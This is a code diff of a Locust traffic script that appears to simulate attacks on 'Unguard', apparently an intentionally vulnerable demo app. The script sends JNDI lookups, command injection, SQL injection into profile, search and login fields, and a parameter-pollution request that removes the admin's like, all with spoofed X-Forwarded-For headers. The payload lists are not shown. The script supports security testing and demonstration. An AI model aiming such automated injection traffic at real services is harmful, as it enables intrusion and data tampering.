@@ -125,7 +125,6 @@ class UnguardUser(HttpUser):
 
     def get_running_username(self):
         global USER_INDEX
-        USER_INDEX += 1
         return "hacker_" + str(USER_INDEX)
 
     def get_random_x_forwarded_for_header(self):
@@ -134,74 +133,81 @@ class UnguardUser(HttpUser):
         }
 
     @task()
+    def performAllExploits(self):
+        self.post_jndi()
+        self.post_cmd()
+        self.post_sql_java()
+        self.post_sql_dotnet()
+        self.get_sql_golang()
+        self.post_sql_login_injection_nodejs()
+        self.post_sql_php()
+
     def post_jndi(self):
-        jndi_post = {'header': "en-US",
-                     'urlmessage': random.choice(JNDI_URIS)}
+        jndi_post = {'language': "en-US",
+                     'url': random.choice(JNDI_URIS)}
 
-        self.client.post("/post", data=jndi_post, headers=self.get_random_x_forwarded_for_header())
+        self.client.post("/api/post", json=jndi_post, headers=self.get_random_x_forwarded_for_header())
         time.sleep(1)
 
-    @task()
     def post_cmd(self):
-        cmd_post = {'imgurl': random.choice(CMDS)}
-
-        self.client.post("/post", data=cmd_post, headers=self.get_random_x_forwarded_for_header())
+        cmd_post = {'imageUrl': random.choice(CMDS)}
+        self.client.post("/api/post", json=cmd_post, headers=self.get_random_x_forwarded_for_header())
         time.sleep(1)
 
-    @task()
     def post_sql_java(self):
         sql_bio = {'bioText': random.choice(SQL_CMDS_BIO)}
 
         # post a bio to make sure a bio for this user exists already and an UPDATE statement is used on the server side
-        self.client.post("/bio/" + self.get_running_username(), data={'bioText': ''})
+        self.client.post(f"/api/user/{self.get_running_username()}/bio", json={'bioText': 'Hello World!'})
 
         # post the malicious SQL command
-        self.client.post("/bio/" + self.get_running_username(), data=sql_bio, headers=self.get_random_x_forwarded_for_header())
+        self.client.post(f"/api/user/{self.get_running_username()}/bio", json=sql_bio, headers=self.get_random_x_forwarded_for_header())
         time.sleep(1)
 
-    @task()
     def post_sql_dotnet(self):
-        sql_membership = {'membershipText': random.choice(SQL_CMDS_MEMBERSHIP)}
+        sql_membership = {'membership': random.choice(SQL_CMDS_MEMBERSHIP)}
 
         # post the malicious SQL command
-        self.client.post("/membership/" + self.get_running_username(), data=sql_membership, headers=self.get_random_x_forwarded_for_header())
+        self.client.post(f"/api/user/{self.get_running_username()}/membership", json=sql_membership, headers=self.get_random_x_forwarded_for_header())
         time.sleep(1)
 
-    @task()
     def get_sql_golang(self):
-        sql_username = {'name': random.choice(SQL_CMDS_USERNAME)}
+        sql_username = {
+                'name': random.choice(SQL_CMDS_USERNAME),
+                'roles': []
+            }
 
         # get with the malicious SQL command
-        self.client.get("/users", params=sql_username, headers=self.get_random_x_forwarded_for_header())
+        self.client.get("/api/users", params=sql_username, headers=self.get_random_x_forwarded_for_header())
         time.sleep(1)
 
-    @task()
     def post_sql_login_injection_nodejs(self):
         parameters = {'username': random.choice(SQL_CMDS_LOGIN_USERNAME), 'password': 'user'}
 
         # get with the malicious SQL command
-        self.client.post("/login", data=parameters, headers=self.get_random_x_forwarded_for_header())
+        self.client.post("/api/auth/login", json=parameters, headers=self.get_random_x_forwarded_for_header())
 
         time.sleep(1)
         self.on_start()
 
-    @task()
     def post_sql_php(self):
         post_id = 1
         user_id = 1
 
         # try to remove the like of the admanger account (user ID 1) on the first post (post ID 1).
-        self.client.get("/unlike", params={'postId': [post_id, user_id]}, headers=self.get_random_x_forwarded_for_header())
+        self.client.delete("/api/like", params={'postId': [post_id, user_id]}, headers=self.get_random_x_forwarded_for_header())
         time.sleep(1)
 
     def on_start(self):
+        global USER_INDEX
+        USER_INDEX += 1
         curr_user = self.get_running_username()
         # super secure passwords :)
         user_data = {"username": curr_user, "password": curr_user}
         cookie_set = False
         while not cookie_set:
-            self.client.post("/register", data=user_data)
-            self.client.post("/login", data=user_data)
+            self.client.post("/api/auth/register", json=user_data)
+            self.client.post("/api/auth/login", json=user_data)
             cookie_set = self.client.cookies.get('jwt') is not None
             if not cookie_set:
                 # wait a bit for deployments to stabilize
